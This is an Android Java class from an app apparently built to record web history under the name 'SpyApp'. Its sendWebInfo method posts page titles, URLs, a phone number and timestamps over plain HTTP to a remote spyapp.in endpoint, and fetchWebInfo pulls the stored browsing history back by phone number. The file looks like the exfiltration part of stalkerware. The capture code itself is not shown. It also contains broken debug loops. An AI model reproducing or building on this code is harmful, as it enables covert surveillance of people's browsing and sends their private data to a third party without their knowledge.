package com.example.avalanche.webhistoryrecording;

/**
 * Created by avalanche on 2/2/17.
 */

import android.os.AsyncTask;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;



/**
 * Created by 5 on 16-Jan-16.
 */
public class AsyncTaskClass extends AsyncTask<String, Void, String>
{
    public ArrayList<SpyApp> webList = new ArrayList<SpyApp>();

    int flag=-1;
    public FetchDataListener listener;

    public AsyncTaskClass(FetchDataListener listener)
    {
        this.listener = listener;
    }
    public AsyncTaskClass()
    {

    }


    @Override
    protected void onPreExecute()
    {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(String... params)
    {
        String result = "";

        if(params[0].equals("Web Info"))
        {
            result=sendWebInfo(params[1],params[2],params[3],params[4]);
          //  flag=1;
        }

        if(params[0].equals("Fetch Web Info"))
        {
            result=fetchWebInfo(params[1]);
            flag=1;
        }

        return result;
    }

    private String fetchWebInfo(String no) {
        String result="";
        try
        {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://www.spyapp.in/spyapp/api/getWebhistory.php");

            System.out.println("get all Web info");
            // Add your data
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
            nameValuePairs.add(new BasicNameValuePair("mobileno",no));

            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            HttpResponse response = httpclient.execute(httppost);

            InputStream is = response.getEntity().getContent();
            InputStreamReader reader = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(reader);
            while (true)
            {
                String str = br.readLine();
                if (str == null)
                    break;
                result = result + str;
            }
            br.close();
            Log.e("call log=>", "" + result);
        }
        catch(Exception e)
        {
            e.printStackTrace();

        }

        Log.e("call log=>", "" + result);
        System.out.println("admin "+result);
        return result;
    }

    private String sendWebInfo(String title,String url,String no,String dateTime ) {
        String result="";
        try
        {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://www.spyapp.in/spyapp/api/web_history.php");

            System.out.println("get all Web info");
            // Add your data
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
            nameValuePairs.add(new BasicNameValuePair("title",title));
            nameValuePairs.add(new BasicNameValuePair("url",url));
            nameValuePairs.add(new BasicNameValuePair("mobile",no));
            nameValuePairs.add(new BasicNameValuePair("date",dateTime));

            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            HttpResponse response = httpclient.execute(httppost);

            InputStream is = response.getEntity().getContent();
            InputStreamReader reader = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(reader);
            while (true)
            {
                String str = br.readLine();
                if (str == null)
                    break;
                result = result + str;
            }
            br.close();
            Log.e("call log=>", "" + result);
        }
        catch(Exception e)
        {
            e.printStackTrace();

        }

        Log.e("call log=>", "" + result);
         System.out.println("admin "+result);
        return result;
    }
    @Override
    protected void onPostExecute(String response)
    {
        if(flag==1)
        {
            System.out.println("res "+response);
           parseWebHistoryInfo(response);

        }
    }

    private void parseWebHistoryInfo(String result) {
        Log.e("ads from server", "response=" + result);
        try
        {


            JSONObject jsonObj = new JSONObject(result);
            System.out.println("size " + jsonObj.length());
            //JSONArray resArray = new JSONArray(result);
            JSONArray resArray = jsonObj.getJSONArray("history");
            System.out.println("len "+resArray.length());
            SpyApp obj;
            for (int i = 0; i < resArray.length(); i++) {
                obj=new SpyApp();
                JSONObject jsonobject = resArray.getJSONObject(i);
                obj.setWebId(jsonobject.getString("webId"));
                obj.setUrl(jsonobject.getString("url"));
                obj.setTitle(jsonobject.getString("title"));
                obj.setNo(jsonobject.getString("mobNumber"));
                obj.setDate(jsonobject.getString("dateTime"));


                webList.add(obj);
            }


        } catch (JSONException e)
        {
            e.printStackTrace();
        }
        if (listener != null)
            listener.onFetchComplete_WebList(webList);
        Log.e("Array value", String.valueOf(webList.size()));

        //Testing......

        for (int i=0;i<7;i++){

            for (int j=0;i<7;i++){

                for (int k=0;k<10;k++){

                    Log.e("print :",k+"");
                    Log.e("payal print :",k+"");
                }
            }

        }

    }





}
